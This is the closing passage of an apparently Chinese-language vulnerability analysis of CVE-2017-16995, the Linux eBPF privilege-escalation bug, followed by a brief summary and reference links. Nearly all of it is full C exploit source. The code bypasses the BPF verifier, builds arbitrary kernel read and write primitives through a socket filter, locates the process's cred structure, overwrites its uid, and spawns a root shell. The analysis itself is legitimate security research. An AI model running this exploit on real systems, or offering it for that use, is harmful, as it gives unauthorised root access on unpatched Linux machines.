        va_end(args);
        exit(1);
    }
    static __u64 ptr_to_u64(void *ptr)
    {
        return (__u64) (unsigned long) ptr;
    }
    int bpf_prog_load(enum bpf_prog_type prog_type,
              const struct bpf_insn *insns, int prog_len,
              const char *license, int kern_version)
    {
        union bpf_attr attr = {
            .prog_type = prog_type,
            .insns = ptr_to_u64((void *) insns),
            .insn_cnt = prog_len / sizeof(struct bpf_insn),
            .license = ptr_to_u64((void *) license),
            .log_buf = ptr_to_u64(bpf_log_buf),
            .log_size = LOG_BUF_SIZE,
            .log_level = 1,
        };
        attr.kern_version = kern_version;
        bpf_log_buf[0] = 0;
        return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    }
    int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
               int max_entries, int map_flags)
    {
        union bpf_attr attr = {
            .map_type = map_type,
            .key_size = key_size,
            .value_size = value_size,
            .max_entries = max_entries
        };
        return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    }
    int bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)
    {
        union bpf_attr attr = {
            .map_fd = fd,
            .key = ptr_to_u64(key),
            .value = ptr_to_u64(value),
            .flags = flags,
        };
        return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
    }
    int bpf_lookup_elem(int fd, void *key, void *value)
    {
        union bpf_attr attr = {
            .map_fd = fd,
            .key = ptr_to_u64(key),
            .value = ptr_to_u64(value),
        };
        return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    }
    #define BPF_ALU64_IMM(OP, DST, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_MOV64_REG(DST, SRC)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_MOV | BPF_X,        \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_MOV32_REG(DST, SRC)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU | BPF_MOV | BPF_X,        \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_MOV64_IMM(DST, IMM)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_MOV | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_MOV32_IMM(DST, IMM)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU | BPF_MOV | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_LD_IMM64(DST, IMM)                    \
        BPF_LD_IMM64_RAW(DST, 0, IMM)
    #define BPF_LD_IMM64_RAW(DST, SRC, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_LD | BPF_DW | BPF_IMM,        \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = (__u32) (IMM) }),            \
        ((struct bpf_insn) {                    \
            .code  = 0,                     \
            .dst_reg = 0,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = ((__u64) (IMM)) >> 32 })
    #ifndef BPF_PSEUDO_MAP_FD
    # define BPF_PSEUDO_MAP_FD    1
    #endif
    #define BPF_LD_MAP_FD(DST, MAP_FD)                \
        BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
    /* Memory load, dst_reg = *(uint *) (src_reg + off16) */
    #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
        ((struct bpf_insn) {                    \
            .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = OFF,                    \
            .imm   = 0 })
    #define BPF_ST_MEM(SIZE, DST, OFF, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,    \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = OFF,                    \
            .imm   = IMM })
    /* Memory store, *(uint *) (dst_reg + off16) = src_reg */
    #define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
        ((struct bpf_insn) {                    \
            .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = OFF,                    \
            .imm   = 0 })
    /* Conditional jumps against immediates, if (dst_reg 'op' imm32) goto pc + off16 */
    #define BPF_JMP_IMM(OP, DST, IMM, OFF)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_JMP | BPF_OP(OP) | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = OFF,                    \
            .imm   = IMM })
    /* Raw code statement block */
    #define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)            \
        ((struct bpf_insn) {                    \
            .code  = CODE,                    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = OFF,                    \
            .imm   = IMM })
    #define BPF_EXIT_INSN()                        \
        ((struct bpf_insn) {                    \
            .code  = BPF_JMP | BPF_EXIT,            \
            .dst_reg = 0,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_BYPASS_CHECK()                                                       \
        BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),               \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),     \
        BPF_MOV64_IMM(BPF_REG_0, 0),                         \
        BPF_EXIT_INSN()                                     
    #define BPF_GET_MAP_FD(idx, dst)                                                                    \
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),        /*mov64 reg1, reg9=mapfd*/                          \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),       /*mov64 reg2, fp */                                 \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),      /*reg2 = reg2-4=fp-4*/                              \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),     /*(u64 *)(fp-4) = idx*/                             \
        BPF_RAW_INSN(BPF_JMP|BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),                              \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),      /*if(r0 == 0){exit(0)}else{jmp 1}*/                 \
        BPF_EXIT_INSN(),                                                                                \
        BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0)      // dst = *(u64 *)(r0)=map[0]
    static int load_prog() {
        struct bpf_insn prog[] = {
            BPF_BYPASS_CHECK(),
            BPF_LD_MAP_FD(BPF_REG_9, mapfd),        //r9=mapfd
            BPF_GET_MAP_FD(0, BPF_REG_6),       //r6=map[0]=op
            BPF_GET_MAP_FD(1, BPF_REG_7),       //r7=map[1]=addr
            BPF_GET_MAP_FD(2, BPF_REG_8),       //r8=map[2]=value
            BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0=&map[2]               */
            BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */
            //get *(u64 *)(fp)=stack_addr
            BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),                //op==0
            BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),        //*r2=map[2]=r10=fp
            BPF_EXIT_INSN(),
            //read
            BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),            //op==1
            BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0x0),   //r3 = *(r7)
            BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),        //*r2=map[2]=r3
            BPF_EXIT_INSN(),
            //write
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),                            //*r7=r8
            BPF_EXIT_INSN(),
        };
        return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog), "GPL", 0);
    }
    void Output(const char *fmt, ...){
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[+] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
    }
    void print(const char *fmt, ...){
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[-] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
    }
    void init_bpf()
    {
        Output("CVE-2017-16995\n");
        Output("bpf create map\n");
        mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3, 0);
        if(mapfd < 0 ){
            Err("bpf map create Error\n");
        }
        Output("load prog\n");
        progfd = load_prog();
        if(progfd < 0 ){
            if(errno == EACCES){
                print("bpf_log_buf: %s\n", bpf_log_buf);
            }
            Err("Load progd Error: %s\n", strerror(errno));
        }
        Output("socket pair\n");
        if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
            Err("create socket pair Error %s\n", strerror(errno));
        }
        Output("set sockopt\n");
        if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
            Err("setsockopt %s\n", strerror(errno));
        }
    }
    static void write_msg(){
        ssize_t n = write(sockets[0], buffer, sizeof(buffer));
        if(n < 0){
            perror("Write");
            return;
        }
        if(n != sizeof(buffer)){
            fprintf(stderr, "short write: %zd\n", n);
        }
    }
    static void update_elem(int key, unsigned long value){
        if(bpf_update_elem(mapfd, &key, &value, 0)){
            Err("bpf_update_elem error %s\n", strerror(errno));
        }
    }
    static unsigned long get_value(int key){
        unsigned long value;
        if(bpf_lookup_elem(mapfd, &key, &value)){
            Err("bpf_lookup_elem %s\n", strerror(errno));
        }
        return value;
    }
    static unsigned long sendcmd(unsigned long op, unsigned long addr, unsigned long value){
        update_elem(0, op);
        update_elem(1, addr);
        update_elem(2, value);
        write_msg();
        return get_value(2);
    }
    void exp(){
        size_t stack_addr = sendcmd(0, 0, 0);
        print("stack_addr: 0x%llx\n", stack_addr);
        size_t ti_addr = (stack_addr)& ~(0x4000-1);
        print("ti_addr: 0x%llx\n", ti_addr);
        size_t task_addr = sendcmd(1, ti_addr, 0);
        if (task_addr < PHYS_OFFSET)
            Err("bogus task ptr");
        print("task_addr: 0x%llx\n", task_addr);
        size_t cred_addr = task_addr + cred_offset;
        size_t cred = sendcmd(1, cred_addr, 0);
        printf("cred: 0x%llx\n", cred);
        size_t uid_addr = cred + uid_offset;
        printf("uid_addr: 0x%llx\n", uid_addr);
        sendcmd(2, uid_addr, 0);
        if(!getuid()){
            print("You are root now\n");
            system("id");
            system("/bin/sh");
            exit(0);
        }
    }
    int main(){
        init_bpf();
        exp();
        return 0;
    }
## 总结
本次分析，仍然有部分不是太清楚的地方，比如 `eBPF`指令执行时，各虚拟寄存器是如何初始化的。以及
`eBPF`是如何实现的，已经`eBPF`的使用也不太熟练。这都是后续需要继续研究的地方。
## 参考
[CVE-2017-16995复现与分析](https://xz.aliyun.com/t/7782)  
[深入分析Ubuntu本地提权漏洞—【CVE-2017-16995】](https://xz.aliyun.com/t/2212)  
[Linux
ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）](http://p4nda.top/2019/01/18/CVE-2017-16995/#BPF-MAP-CREATE)  
[ThreadInfo结构和内核栈的两种关系](https://cloud.tencent.com/developer/article/1603829)